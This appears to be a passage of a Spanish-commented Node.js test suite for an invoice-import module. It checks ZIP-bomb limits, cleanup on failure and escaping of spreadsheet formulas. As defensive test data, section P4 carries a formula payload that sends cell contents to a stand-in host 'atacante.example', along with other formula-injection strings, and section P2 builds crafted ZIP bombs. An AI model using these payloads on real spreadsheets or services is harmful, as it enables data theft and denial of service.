// Incremento 7 · módulo C (facturas de clientes) · revisión independiente 7c, ruta de importación: un caso por hallazgo. Cada sección
// reproduce el escenario de la revisión (tests/revision7/pN-*.js, que fallaba antes del arreglo) y comprueba lo corregido:
//  P2. ZIP: el índice (directorio central) se lee ANTES de inflar (indiceZip) y lo que no cabe se rechaza sin llamar a Utilities.unzip;
//      el presupuesto (60 MB descomprimido, 400 archivos, 1000 entradas) es POR ENVÍO, contando los sueltos; después de inflar se
//      vuelve a medir (un ZIP que miente en su índice se rechaza); descomprimir_ es la única llamada a Utilities.unzip y corta con
//      un límite; los bytes de lo que no se va a guardar se sueltan al emparejar.
//  P3. Un archivo que no cabe en la hoja (REP de 400 facturas, 1,300 relacionadas) se rechaza solo, antes de crear nada en Drive, y el
//      resto del envío sigue; los textos libres se recortan (nombre de 60,000 caracteres); todo archivo creado en la llamada que no
//      quedó en un renglón va a la Papelera: PDF que falla en Drive, el candado que no se toma, la escritura que truena.
//  P4. Regla 7: todo texto del XML que va a la hoja pasa por textoCelda (o lleva apóstrofo); las monedas de un complemento de pago
//      solo MXN o USD (su propia Moneda, XXX); UUID de relacionados y documentos pagados bien formados.
//  P7. Un CFDI de Helgen a Helgen no entra como factura de cliente (I, E ni P); los demás del envío sí.
//  P8. atributosXml: &#x110000; o una mitad de par sustituto → "El XML no es válido" (no RangeError); "&#38;lt;" se decodifica una
//      vez; con XML válido da lo mismo que antes (comparado con la versión anterior).
//  P9. mod-facturas: si actualizar la lista falla (también con PERMISO), el error se ve y lo de antes no pasa por algo al día.
// Uso: node tests/revision7-importar.test.js .
'use strict';
const assert = require('assert'), fs = require('fs'), path = require('path'), vm = require('vm'), zlib = require('zlib');
const dir = process.argv[2] || '.';
const C = require('./revision7/comun'); // constructores de CFDI y ZIP, Utilities.unzip simulado (cuenta lo inflado)
const { HELGEN, URE, U, cfdi, crearZip, b64 } = C;
const MB = 1024 * 1024;

function crear(op) {
  const A = require('./arnes')(dir, Object.assign({ props: { ROL_COBRANZA: 'tania@helgen.tech', ROL_COMPRAS: 'pedro@helgen.tech',
    ROL_REQUISICION: 'obrero@helgen.tech', SUPER_ADMIN: 'leo@helgen.tech' } }, op || {}));
  A.unzips = 0;
  A.ctx.Utilities.unzip = b => { A.unzips++; return C.unzip(b); };
  const getFile = A.ctx.DriveApp.getFileById;
  A.ctx.DriveApp.getFileById = id => Object.assign(getFile(id), { setTrashed: v => { A.archivos[id].trashed = !!v; } });
  A.facturasDrive = () => Object.values(A.archivos).filter(a => a.blob && /^(Factura|Nota de crédito|Complemento de pago) /.test(a.blob.name));
  A.vivos = () => A.facturasDrive().filter(a => !a.trashed).length;
  A.filas = () => ((A.libros[A.props.COBRANZA_DB_ID] || { pest: {} }).pest.FacturasClientes || { m: [[]] }).m.slice(1);
  A.enc = A.plain(A.correr('HOJAS_COBRANZA.FacturasClientes.enc'));
  A.col = n => A.enc.indexOf(n);
  A.envio = (archivos, idSolicitud) => A.ok('tania', 'importarFacturasClientes', { archivos, idSolicitud: idSolicitud || C.id('imp') });
  return A;
}
const res = (r, n) => r.resultados.find(x => x.archivo === n) || assert.fail('sin resultado: ' + n + ' en ' + r.resultados.map(x => x.archivo).join(' | '));
const pdf = (n, relleno) => { const b = Buffer.alloc(n, relleno == null ? 0x20 : relleno); b.write('%PDF-1.7'); return b; };
const firmados = b => [...b].map(x => x > 127 ? x - 256 : x);
/** Busca la n-ésima firma de 4 bytes en un ZIP (encabezado local 0x04034b50, índice 0x02014b50, fin 0x06054b50). */
const firma = (z, sig, n) => { let k = -1; for (let i = 0; i <= (n || 0); i++) { k = z.indexOf(Buffer.from([sig & 0xFF, (sig >> 8) & 0xFF, (sig >> 16) & 0xFF, sig >>> 24]), k + 1); } return k; };
const LOCAL = 0x04034b50, CENTRAL = 0x02014b50, FIN = 0x06054b50;

// ================= P2 · ZIP: límites antes de inflar, por envío, y otra vez después =================
{
  const A = crear();
  // ---- indiceZip (pura): ZIP de otras herramientas, ZIP64, y lo que se rechaza sin inflar ----
  const ix = z => A.plain(A.P.indiceZip(firmados(z)));
  const z1 = crearZip([{ nombre: 'Octubre/', datos: null }, { nombre: 'Octubre/A-1.xml', datos: Buffer.from('<a>' + 'x'.repeat(5000) + '</a>') },
    { nombre: '__MACOSX/._A-1.xml', datos: Buffer.from('junk') }]);
  assert.deepEqual(ix(z1), { total: 5011, entradas: [{ nombre: 'Octubre/', carpeta: true, tamano: 0, comprimido: 0, metodo: 0 },
    { nombre: 'Octubre/A-1.xml', carpeta: false, tamano: 5007, comprimido: ix(z1).entradas[1].comprimido, metodo: 8 },
    { nombre: '__MACOSX/._A-1.xml', carpeta: false, tamano: 4, comprimido: ix(z1).entradas[2].comprimido, metodo: 8 }] });
  assert.deepEqual(['Octubre/', 'Octubre/A-1.xml', '__MACOSX/._A-1.xml', 'a/.DS_Store', 'A-2.pdf'].map(A.P.esArchivoDeZip), [false, true, false, false, true]);
  // Python zipfile: escrito a un flujo (descriptor de datos, bit 3: tamaños solo en el índice) y con ZIP64 forzado (encabezados locales en 0xFFFFFFFF)
  const PY_FLUJO = 'UEsDBBQACAAIAAAAIQAAAAAAAAAAAAAAAAASAAAARmFjdHVyYXMvQS0xMDEueG1s7cExEQAACASgSBbw7PItjG8KN6AzCwAAAAA86socUEsHCAnUmu8eAAAAiRMAAFBLAwQUAAgACAAAACEAAAAAAAAAAAAAAAAAEgAAAEZhY3R1cmFzL0EtMTAxLnBkZlMNcHHTNdQzV8jIz0kEAFBLBwixs2pbDwAAAA0AAABQSwMEFAAIAAgAAAAhAAAAAAAAAAAAAAAAAAwAAABfX01BQ09TWC8uX0HLKs3LBgBQSwcIOZz7BgYAAAAEAAAAUEsDBBQACAgIAAAAIQAAAAAAAAAAAAAAAAALAAAAw7FhbmTDui54bWyzSdK3AwBQSwcIjaKXAwYAAAAEAAAAUEsBAhQDFAAIAAgAAAAhAAnUmu8eAAAAiRMAABIAAAAAAAAAAAAAAIABAAAAAEZhY3R1cmFzL0EtMTAxLnhtbFBLAQIUAxQACAAIAAAAIQCxs2pbDwAAAA0AAAASAAAAAAAAAAAAAACAAV4AAABGYWN0dXJhcy9BLTEwMS5wZGZQSwECFAMUAAgACAAAACEAOZz7BgYAAAAEAAAADAAAAAAAAAAAAAAAgAGtAAAAX19NQUNPU1gvLl9BUEsBAhQDFAAICAgAAAAhAI2ilwMGAAAABAAAAAsAAAAAAAAAAAAAAIAB7QAAAMOxYW5kw7oueG1sUEsFBgAAAAAEAAQA8wAAACwBAAAAAA==';
  const PY_ZIP64 = 'UEsDBBQAAAAAAAAAIQAAAAAAAAAAAAAAAAAJAAAARmFjdHVyYXMvUEsDBC0AAAAIAAAAIQAJ1Jrv//////////8SABQARmFjdHVyYXMvQS0xMDEueG1sAQAQAIkTAAAAAAAAHgAAAAAAAADtwTERAAAIBKBIFvDs8i2Mbwo3oDMLAAAAADzqyhxQSwMELQAAAAgAAAAhALGzalv//////////xIAFABGYWN0dXJhcy9BLTEwMS5wZGYBABAADQAAAAAAAAAPAAAAAAAAAFMNcHHTNdQzV8jIz0kEAFBLAwQtAAAACAAAACEAOZz7Bv//////////DAAUAF9fTUFDT1NYLy5fQQEAEAAEAAAAAAAAAAYAAAAAAAAAyyrNywYAUEsDBC0AAAgIAAAAIQCNopcD//////////8LABQAw7FhbmTDui54bWwBABAABAAAAAAAAAAGAAAAAAAAALNJ0rcDAFBLAQIUAxQAAAAAAAAAIQAAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAACAAQAAAABGYWN0dXJhcy9QSwECLQMtAAAACAAAACEACdSa7x4AAACJEwAAEgAAAAAAAAAAAAAAgAEnAAAARmFjdHVyYXMvQS0xMDEueG1sUEsBAi0DLQAAAAgAAAAhALGzalsPAAAADQAAABIAAAAAAAAAAAAAAIABiQAAAEZhY3R1cmFzL0EtMTAxLnBkZlBLAQItAy0AAAAIAAAAIQA5nPsGBgAAAAQAAAAMAAAAAAAAAAAAAACAAdwAAABfX01BQ09TWC8uX0FQSwECLQMtAAAICAAAACEAjaKXAwYAAAAEAAAACwAAAAAAAAAAAAAAgAEgAQAAw7FhbmTDui54bWxQSwUGAAAAAAUABQAqAQAAYwEAAAAA';
  assert.deepEqual(ix(Buffer.from(PY_FLUJO, 'base64')).entradas.map(e => [e.nombre, e.tamano]),
    [['Facturas/A-101.xml', 5001], ['Facturas/A-101.pdf', 13], ['__MACOSX/._A', 4], ['ñandú.xml', 4]], 'descriptor de datos (macOS, Java)');
  assert.deepEqual([ix(Buffer.from(PY_ZIP64, 'base64')).total, ix(Buffer.from(PY_ZIP64, 'base64')).entradas.length], [5022, 5], 'encabezados locales ZIP64');
  // ZIP64 completo (índice y tamaños en el campo extra 0x0001), hecho a mano
  const zip64 = (() => {
    const nombre = Buffer.from('a.xml'), datos = Buffer.from('<a>zip64</a>'), crc = zlib.crc32(datos), u64 = v => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; };
    const h = Buffer.alloc(30); h.writeUInt32LE(LOCAL, 0); h.writeUInt16LE(45, 4); h.writeUInt32LE(crc, 14); h.writeUInt32LE(0xFFFFFFFF, 18); h.writeUInt32LE(0xFFFFFFFF, 22);
    h.writeUInt16LE(nombre.length, 26); h.writeUInt16LE(20, 28);
    const xl = Buffer.concat([Buffer.from([1, 0, 16, 0]), u64(datos.length), u64(datos.length)]);
    const local = Buffer.concat([h, nombre, xl, datos]);
    const c = Buffer.alloc(46); c.writeUInt32LE(CENTRAL, 0); c.writeUInt16LE(45, 4); c.writeUInt16LE(45, 6); c.writeUInt32LE(crc, 16);
    c.writeUInt32LE(0xFFFFFFFF, 20); c.writeUInt32LE(0xFFFFFFFF, 24); c.writeUInt16LE(nombre.length, 28); c.writeUInt16LE(28, 30); c.writeUInt32LE(0xFFFFFFFF, 42);
    const cd = Buffer.concat([c, nombre, Buffer.from([1, 0, 24, 0]), u64(datos.length), u64(datos.length), u64(0)]);
    const r = Buffer.alloc(56); r.writeUInt32LE(0x06064b50, 0); r.writeBigUInt64LE(44n, 4); r.writeUInt16LE(45, 12); r.writeUInt16LE(45, 14);
    r.writeBigUInt64LE(1n, 24); r.writeBigUInt64LE(1n, 32); r.writeBigUInt64LE(BigInt(cd.length), 40); r.writeBigUInt64LE(BigInt(local.length), 48);
    const loc = Buffer.alloc(20); loc.writeUInt32LE(0x07064b50, 0); loc.writeBigUInt64LE(BigInt(local.length + cd.length), 8); loc.writeUInt32LE(1, 16);
    const fin = Buffer.alloc(22); fin.writeUInt32LE(FIN, 0); fin.writeUInt16LE(0xFFFF, 8); fin.writeUInt16LE(0xFFFF, 10); fin.writeUInt32LE(0xFFFFFFFF, 12); fin.writeUInt32LE(0xFFFFFFFF, 16);
    return Buffer.concat([local, cd, r, loc, fin]);
  })();
  assert.deepEqual(ix(zip64).entradas.map(e => [e.nombre, e.tamano, e.comprimido, e.metodo]), [['a.xml', 12, 12, 0]], 'ZIP64');
  // Lo que se rechaza solo con el índice
  const parche = (z, f) => { const y = Buffer.from(z); f(y); return firmados(y); };
  const rechaza = (b, re, que) => assert.throws(() => A.P.indiceZip(b), e => re.test(e.message), que);
  const zx = crearZip([{ nombre: 'a.xml', datos: Buffer.from('<a>hola</a>') }]);
  rechaza(firmados(Buffer.from('PK\x03\x04 dañado')), /dañado \(sin índice\)/, 'sin fin de índice');
  rechaza(parche(zx, y => y.writeUInt16LE(y.readUInt16LE(firma(y, CENTRAL) + 8) | 1, firma(y, CENTRAL) + 8)), /contraseña/, 'cifrado');
  rechaza(parche(zx, y => y.writeUInt16LE(9, firma(y, CENTRAL) + 10)), /método 9/, 'deflate64');
  rechaza(parche(zx, y => y.writeUInt32LE(999, firma(y, CENTRAL) + 24)), /no cuadra con la entrada 1/, 'índice ≠ encabezado local');
  rechaza(parche(zx, y => y.writeUInt16LE(1, firma(y, FIN) + 4)), /varias partes/, 'en varias partes');
  rechaza(parche(crearZip([{ nombre: 'c/', datos: null }]), y => { y.writeUInt32LE(5, firma(y, CENTRAL) + 24); y.writeUInt32LE(5, firma(y, LOCAL) + 22); }),
    /dañado \(entrada 1\)/, 'guardado sin comprimir que no pesa lo que dice');
  // Dos entradas del índice con los mismos datos (la "bomba" que se encima): rechazada
  const encimado = (() => { const y = Buffer.from(zx), f = firma(y, FIN), ini = y.readUInt32LE(f + 16), cd = y.slice(ini, f), fin = Buffer.from(y.slice(f));
    fin.writeUInt16LE(2, 8); fin.writeUInt16LE(2, 10); fin.writeUInt32LE(cd.length * 2, 12); return firmados(Buffer.concat([y.slice(0, f), cd, fin])); })();
  rechaza(encimado, /encimadas/, 'entradas encimadas');

  // ---- La bomba de la revisión (A): ~0.1 MB que dice inflarse a 100 MB → rechazada SIN llamar a Utilities.unzip ----
  const bomba = crearZip([{ nombre: 'factura.xml', datos: Buffer.alloc(100 * MB, 0x20) }]);
  assert(bomba.length < 0.2 * MB && A.P.indiceZip(firmados(bomba)).total === 100 * MB);
  let infl = C.inflado();
  let r = A.envio([{ nombre: 'contalink.zip', datos: bomba.toString('base64') }]);
  assert.equal(res(r, 'contalink.zip').mensaje, 'El ZIP descomprimido pesa más de 60 MB: divídelo en partes.');
  assert.deepEqual([A.unzips, C.inflado() - infl], [0, 0], 'nada se infló');

  // ---- (B) El límite es por envío: tres ZIP de 25 MB (cada uno cabe solo) → el tercero se rechaza sin inflarse ----
  const zip25 = n => crearZip([{ nombre: 'A-' + n + '.pdf', datos: pdf(25 * MB) }]).toString('base64');
  infl = C.inflado();
  r = A.envio([{ nombre: 'p1.zip', datos: zip25(1) }, { nombre: 'p2.zip', datos: zip25(2) }, { nombre: 'p3.zip', datos: zip25(3) }]);
  assert.equal(A.unzips, 2, 'solo los dos primeros se abren');
  assert.equal(C.inflado() - infl, 50 * MB);
  assert.equal(res(r, 'p3.zip').mensaje, 'El ZIP descomprimido pesa más de 60 MB junto con lo demás de este envío (50 MB): divídelo en partes.');
  assert(/pesa más de 10 MB/.test(res(r, 'p1.zip › A-1.pdf').mensaje), 'el PDF de 25 MB se rechaza');
  // Los sueltos también cuentan (y no importa el orden): 5 MB sueltos + un ZIP de 56 MB
  A.unzips = 0;
  r = A.envio([{ nombre: 'p56.zip', datos: crearZip([{ nombre: 'x.pdf', datos: pdf(56 * MB) }]).toString('base64') }, { nombre: 'suelto.pdf', datos: pdf(5 * MB).toString('base64') }]);
  assert.deepEqual([A.unzips, res(r, 'p56.zip').mensaje], [0, 'El ZIP descomprimido pesa más de 60 MB junto con lo demás de este envío (5 MB): divídelo en partes.']);
  // Archivos: 400 por envío (ZIP + sueltos), sin inflar el que ya no cabe
  A.unzips = 0;
  const muchos = (n, pre) => crearZip(Array.from({ length: n }, (_, i) => ({ nombre: pre + i + '.xml', datos: Buffer.from('<a/>') }))).toString('base64');
  r = A.envio([{ nombre: 'a.zip', datos: muchos(250, 'a') }, { nombre: 'b.zip', datos: muchos(200, 'b') }]);
  assert.equal(res(r, 'b.zip').mensaje, 'El ZIP trae 200 archivos (máximo 400 por envío y este ya trae 250): descárgalo de CONTALINK por periodos más cortos.');
  assert.equal(A.unzips, 1);
  r = A.envio([{ nombre: 'c.zip', datos: muchos(401, 'c') }]);
  assert.equal(res(r, 'c.zip').mensaje, 'El ZIP trae 401 archivos (máximo 400): descárgalo de CONTALINK por periodos más cortos.');
  // Entradas contando la basura: 1,010 (50 archivos + 960 de __MACOSX) → rechazado sin inflar
  A.unzips = 0;
  const basura = crearZip(Array.from({ length: 50 }, (_, i) => ({ nombre: 'f' + i + '.xml', datos: Buffer.from('<a/>') }))
    .concat(Array.from({ length: 960 }, (_, i) => ({ nombre: '__MACOSX/._f' + i, datos: Buffer.from('j') }))));
  r = A.envio([{ nombre: 'mac.zip', datos: basura.toString('base64') }]);
  assert.deepEqual([A.unzips, /1010 entradas contando carpetas y archivos ocultos \(máximo 1000 por envío\)/.test(res(r, 'mac.zip').mensaje)], [0, true]);

  // ---- Un ZIP que miente en su índice: se infla (en Apps Script no se puede evitar) pero se mide y se rechaza entero ----
  const miente = (real, dice) => { const y = crearZip([{ nombre: 'A-9.xml', datos: real }]);
    y.writeUInt32LE(dice, firma(y, CENTRAL) + 24); y.writeUInt32LE(dice, firma(y, LOCAL) + 22); return y; };
  const xml9 = Buffer.from(cfdi({ uuid: U(9), folio: '9' }) + ' '.repeat(300000));
  r = A.envio([{ nombre: 'miente.zip', datos: miente(xml9, 1000).toString('base64') }]);
  assert(/^El ZIP no cuadra con su índice \(dice 1 entradas y 0 MB; trae 1 y 0\.3 MB\): no se usó/.test(res(r, 'miente.zip').mensaje), res(r, 'miente.zip').mensaje);
  assert.equal(r.conteos.importadas, 0, 'nada de un ZIP que miente');
  // …y si lo que sale pasa del límite del envío, descomprimir_ corta (y el envío ya no abre más ZIP)
  r = A.envio([{ nombre: 'bomba-mentirosa.zip', datos: miente(Buffer.alloc(61 * MB, 0x20), 1000).toString('base64') },
    { nombre: 'honesto.zip', datos: crearZip([{ nombre: 'A-10.xml', datos: Buffer.from(cfdi({ uuid: U(10), folio: '10' })) }]).toString('base64') }]);
  assert(/pesa descomprimido más de lo que dice su índice/.test(res(r, 'bomba-mentirosa.zip').mensaje));
  assert(/pesa más de 60 MB junto con lo demás de este envío/.test(res(r, 'honesto.zip').mensaje));
  // descomprimir_: con límite lanza zipExcedido; sin límite, todo
  const blob = A.ctx.Utilities.newBlob(firmados(z1), 'application/zip', 'z.zip');
  assert.throws(() => A.P.descomprimir_(blob, 5000), e => e.zipExcedido === true);
  assert.deepEqual(A.P.descomprimir_(blob).map(x => [x.nombre, x.bytes.length]), [['Octubre/', 0], ['Octubre/A-1.xml', 5007], ['__MACOSX/._A-1.xml', 4]]);
  // Una sola costura: Utilities.unzip solo dentro de descomprimir_ (el puente de la etapa 1 solo tiene que dar esa función)
  const SRC = fs.readFileSync(path.join(dir, 'Code.js'), 'utf8');
  assert.equal((SRC.match(/Utilities\.unzip\(/g) || []).length, 1);
  assert(/function descomprimir_\(blob, limite\) \{[\s\S]{0,200}Utilities\.unzip\(blob\)/.test(SRC));

  // ---- Lo que no se va a guardar no se queda: al emparejar se sueltan los bytes (y los de lo guardado, al pasar a Drive) ----
  A.correr('var __soltar = soltarBytesNoUsados; soltarBytesNoUsados = function (e, l) { __soltar(e, l); ' +
    '__vistas = e.map(function (x) { return [x.nombre, !!x.bytes]; }); __entradas = e; };');
  const zipMixto = crearZip([{ nombre: 'A-20.xml', datos: Buffer.from(cfdi({ uuid: U(20), folio: '20' })) }, { nombre: 'A-20.pdf', datos: pdf(1000) },
    { nombre: 'huerfano.pdf', datos: pdf(1000) }, { nombre: 'proveedor.xml', datos: Buffer.from(cfdi({ uuid: U(21), emisor: C.PROV, receptor: HELGEN })) },
    { nombre: 'grande.pdf', datos: pdf(11 * MB) }]);
  r = A.envio([{ nombre: 'mixto.zip', datos: zipMixto.toString('base64') }]);
  assert.deepEqual(r.resultados.map(x => x.estado), ['importada', 'rechazada', 'pdf', 'rechazada', 'rechazada']);
  assert.deepEqual(A.plain(A.ctx.__vistas), [['mixto.zip › A-20.xml', true], ['mixto.zip › A-20.pdf', true], ['mixto.zip › huerfano.pdf', false],
    ['mixto.zip › proveedor.xml', false], ['mixto.zip › grande.pdf', false]], 'después de emparejar solo quedan la factura y su PDF');
  assert(A.ctx.__entradas.every(e => e.bytes === null), 'y al pasar a Drive ya no queda nada');
}

// ================= P3 · un archivo que no cabe no tumba el envío; nada huérfano en Drive =================
{
  const A = crear();
  const I1 = cfdi({ uuid: U(1), folio: '101' });
  const docs = Array.from({ length: 400 }, (_, i) => ({ uuid: U(5000 + i), ant: '100.00', pagado: '100.00', insoluto: '0.00', folio: String(i) }));
  const P1 = cfdi({ tipo: 'P', uuid: U(900), serie: 'P', folio: '1', pagos: [{ fecha: '2026-10-20', monto: '40000.00', docs }] });
  const envio = () => A.envio([{ nombre: 'A-101.xml', datos: b64(I1) }, { nombre: 'A-101.pdf', datos: A.PDF }, { nombre: 'REP-1.xml', datos: b64(P1) }], 'mismo-envio');
  let r = envio();
  assert.deepEqual(r.resultados.map(x => [x.archivo, x.estado]), [['A-101.xml', 'importada'], ['REP-1.xml', 'rechazada'], ['A-101.pdf', 'pdf']]);
  assert(/^El CFDI trae demasiados pagos para guardarlo: no cabe en una celda de la hoja \(\d+ caracteres; máximo 45000\)/.test(res(r, 'REP-1.xml').mensaje), res(r, 'REP-1.xml').mensaje);
  assert.deepEqual([A.filas().length, A.vivos(), A.facturasDrive().length], [1, 2, 2], 'la factura y su PDF; del REP no se creó nada');
  r = envio(); // reintento: nada nuevo en Drive
  assert.deepEqual([res(r, 'A-101.xml').estado, A.filas().length, A.facturasDrive().length], ['importada', 1, 2]);
  // Relacionadas de más (1,300 UUID ≈ 60,000 caracteres): rechazada sola
  const E1 = cfdi({ tipo: 'E', uuid: U(501), serie: 'NC', folio: '1', extra: '' }).replace('<cfdi:Emisor',
    '<cfdi:CfdiRelacionados TipoRelacion="01">' + Array.from({ length: 1300 }, (_, i) => '<cfdi:CfdiRelacionado UUID="' + U(20000 + i) + '"/>').join('') + '</cfdi:CfdiRelacionados><cfdi:Emisor');
  r = A.envio([{ nombre: 'NC-1.xml', datos: b64(E1) }, { nombre: 'A-102.xml', datos: b64(cfdi({ uuid: U(2), folio: '102' })) }]);
  assert(/demasiados documentos relacionados/.test(res(r, 'NC-1.xml').mensaje) && res(r, 'A-102.xml').estado === 'importada');

  // Variante B: Sheets rechaza una celda de más de 50,000 caracteres (simulado): los textos libres se recortan antes
  const B = crear();
  const escritos = [];
  const escribe0 = B.ctx.escribe_;
  const limite = v => { if (v.some(f => f.some(c => typeof c === 'string' && c.length > 50000))) throw new Error('Your input contains more than the maximum of 50000 characters in a single cell.'); };
  B.ctx.escribe_ = hoja => { const h = escribe0(hoja);
    return Object.assign(Object.create(h), { appendRow: f => { limite([f]); return h.appendRow(f); },
      getRange: (...a) => { const g = h.getRange(...a); return Object.assign(Object.create(g), { setValues: v => { limite(v); escritos.push(...v); return g.setValues(v); } }); } }); };
  r = B.envio([{ nombre: 'A-101.xml', datos: b64(I1) }, { nombre: 'A-102.xml', datos: b64(cfdi({ uuid: U(2), folio: '102', nombreReceptor: 'N'.repeat(60000) })) }]);
  assert.deepEqual([r.conteos.importadas, B.filas().length, B.vivos()], [2, 2, 2]);
  const nombre = B.filas().find(f => f[0] === U(2))[B.col('receptor_nombre')];
  assert.deepEqual([nombre.length, nombre.slice(-2)], [254, 'N…'], 'nombre recortado al largo del SAT');
  assert.equal(res(r, 'A-102.xml').receptor.length, 254, 'también en el resultado (no se manda el texto enorme)');

  // Drive falla con el PDF después de crear el XML: esa factura se rechaza y su XML va a la Papelera; las demás siguen
  const D = crear();
  D.correr('var __arch = archivoPrivado_; archivoPrivado_ = function (c, b, mime, n) { if (mime === "application/pdf") throw new Error("Drive no responde"); return __arch.apply(null, arguments); };');
  r = D.envio([{ nombre: 'A-101.xml', datos: b64(I1) }, { nombre: 'A-101.pdf', datos: D.PDF }, { nombre: 'A-102.xml', datos: b64(cfdi({ uuid: U(2), folio: '102' })) }]);
  assert.deepEqual([res(r, 'A-101.xml').estado, res(r, 'A-101.xml').mensaje, res(r, 'A-102.xml').estado], ['rechazada', 'No se pudo guardar en Drive: Drive no responde', 'importada']);
  assert.deepEqual([res(r, 'A-101.pdf').estado, res(r, 'A-101.pdf').mensaje], ['rechazada', 'No se guardó: su XML (A-101) no se pudo guardar.'], 'su PDF no dice "PDF"');
  assert.deepEqual([D.filas().length, D.vivos(), D.facturasDrive().filter(a => a.trashed).map(a => a.blob.name.slice(0, 13))], [1, 1, ['Factura A-101']]);

  // El candado no se pudo tomar (después de crear los archivos): la llamada falla y TODO lo creado va a la Papelera
  const T = crear();
  T.correr('var __arch = archivoPrivado_, __cand = candado_, __n = 0; archivoPrivado_ = function () { const a = __arch.apply(null, arguments); ' +
    'if (++__n === 3) candado_ = function () { candado_ = __cand; return { tryLock: function () { return false; }, releaseLock: function () {}, hasLock: function () { return false; } }; }; return a; };');
  const tres = [{ nombre: 'A-101.xml', datos: b64(I1) }, { nombre: 'A-101.pdf', datos: T.PDF }, { nombre: 'A-102.xml', datos: b64(cfdi({ uuid: U(2), folio: '102' })) }];
  T.falla('tania', 'importarFacturasClientes', [{ archivos: tres, idSolicitud: 't1' }], /está ocupado guardando otro registro/);
  assert.deepEqual([T.filas().length, T.facturasDrive().length, T.vivos()], [0, 3, 0], 'tres archivos creados, los tres en la Papelera');
  assert.equal(T.envio(tres, 't1').conteos.importadas, 2, 'el reintento importa normal');
  assert.equal(T.vivos(), 3);

  // La escritura dentro del candado truena: lo mismo
  const W = crear();
  const escW = W.ctx.escribe_;
  W.ctx.escribe_ = hoja => { const h = escW(hoja); return Object.assign(Object.create(h), { getRange: (...a) => { const g = h.getRange(...a);
    return Object.assign(Object.create(g), { setValues: v => { if (v.some(f => /^[0-9A-F]{8}-[0-9A-F]{4}-/.test(f[0]))) throw new Error('Service Spreadsheets failed'); return g.setValues(v); } }); } }); };
  W.falla('tania', 'importarFacturasClientes', [{ archivos: tres, idSolicitud: 'w1' }], /Service Spreadsheets failed/);
  assert.deepEqual([W.filas().length, W.facturasDrive().length, W.vivos()], [0, 3, 0]);
  // Dos veces la misma factura con su PDF que llega después a una ya importada con PDF: el PDF sobrante a la Papelera
  const Z = crear();
  Z.envio([{ nombre: 'A-101.xml', datos: b64(I1) }, { nombre: 'A-101.pdf', datos: Z.PDF }]);
  Z.correr('var __f = facturasClientesDelLibro_; facturasClientesDelLibro_ = function (l) { return __f(l).map(function (f) { return Object.assign({}, f, { pdfId: "" }); }); };');
  r = Z.envio([{ nombre: 'A-101.pdf', datos: Z.PDF }]); // fuera del candado parecía sin PDF; dentro ya lo tiene
  Z.correr('facturasClientesDelLibro_ = __f;');
  assert.deepEqual([r.resultados[0].estado, Z.facturasDrive().length, Z.vivos()], ['ignorada', 3, 2]);
}

// ================= P4 · regla 7 y monedas del complemento de pago =================
{
  const A = crear();
  const escritos = [];
  const escribe0 = A.ctx.escribe_;
  A.ctx.escribe_ = hoja => { const h = escribe0(hoja);
    return Object.assign(Object.create(h), { appendRow: f => { escritos.push(f); return h.appendRow(f); },
      getRange: (...a) => { const g = h.getRange(...a); return Object.assign(Object.create(g), { setValues: v => { escritos.push(...v); return g.setValues(v); } }); } }); };
  const formula = '=IMAGE("https://atacante.example/c?d="&ENCODEURL(B2))';
  const rep = (o, d) => cfdi(Object.assign({ tipo: 'P', uuid: U(77), serie: 'P', folio: '9',
    pagos: [{ fecha: '2026-10-20', monto: '1.00', moneda: 'MXN', docs: [Object.assign({ uuid: U(1), ant: '1.00', pagado: '1.00', insoluto: '0.00' }, d || {})] }] }, o));
  let r = A.envio([{ nombre: 'rep.xml', datos: b64(rep({ pagos: [{ fecha: '2026-10-20', monto: '1.00', moneda: formula, docs: [{ uuid: U(1), ant: '1.00', pagado: '1.00', insoluto: '0.00' }] }] })) },
    { nombre: 'rep-dr.xml', datos: b64(rep({ uuid: U(78) }, { moneda: 'EUR' })) },
    { nombre: 'rep-uuid.xml', datos: b64(rep({ uuid: U(79) }).replace(/IdDocumento="[^"]*"/, 'IdDocumento="=1+1"')) },
    { nombre: 'rep-xxx.xml', datos: b64(rep({ uuid: U(80) }).replace('Moneda="XXX"', 'Moneda="=1+1"')) },
    { nombre: 'rep-ok.xml', datos: b64(rep({ uuid: U(81) })) }]);
  assert.deepEqual(r.resultados.map(x => x.estado), ['rechazada', 'rechazada', 'rechazada', 'rechazada', 'importada']);
  assert(/^El complemento de pago trae un pago en =IMAGE\("HTTPS:\/\/ATACANTE\.EXAMPLE\/C\?D="&ENCODEURL\(B2\)\): CAPRI solo maneja MXN y USD\.$/.test(res(r, 'rep.xml').mensaje), res(r, 'rep.xml').mensaje);
  assert.equal(res(r, 'rep-dr.xml').mensaje, 'El complemento de pago paga un documento en EUR: CAPRI solo maneja MXN y USD.');
  assert(/documento con un folio fiscal \(UUID\) no válido/.test(res(r, 'rep-uuid.xml').mensaje));
  assert(/dice moneda =1\+1 \(debe ser XXX\)/.test(res(r, 'rep-xxx.xml').mensaje));
  // Todo texto del XML: con textoCelda (o apóstrofo), nunca una fórmula; en la hoja queda el texto tal cual
  const malo = cfdi({ uuid: U(90), serie: '=1+1', folio: '2', receptor: '+52XAXX', nombreReceptor: '=HYPERLINK("https://x.example","clic")' })
    .replace('FormaPago="03"', 'FormaPago="-03"').replace('UsoCFDI="G03"', 'UsoCFDI="@G03"').replace(/FechaTimbrado="[^"]*"/, 'FechaTimbrado="=NOW()"');
  escritos.length = 0;
  r = A.envio([{ nombre: '=A-90.xml', datos: b64(malo) }]);
  assert.equal(r.resultados[0].estado, 'importada');
  const fila = escritos.find(f => f[0] === U(90));
  const formulas = escritos.reduce((a, f) => a.concat(f), []).filter(v => typeof v === 'string' && /^[=+\-@]/.test(v));
  assert.deepEqual(formulas, [], 'nada se manda a Sheets como fórmula');
  assert.deepEqual(['serie_folio', 'forma', 'receptor_rfc', 'receptor_nombre', 'uso_cfdi', 'fecha_timbrado', 'archivo_xml'].map(k => fila[A.col(k)]),
    ["'=1+1-2", "'-03", "'+52XAXX", '\'=HYPERLINK("https://x.example","clic")', "'@G03", "'=NOW()", "'=A-90.xml"]);
  const enHoja = A.filas().find(f => f[0] === U(90));
  assert.deepEqual([enHoja[A.col('receptor_nombre')], enHoja[A.col('serie_folio')]], ['=HYPERLINK("https://x.example","clic")', '=1+1-2'], 'en la hoja: el texto');
  // Relacionado con un UUID que no es UUID: rechazado
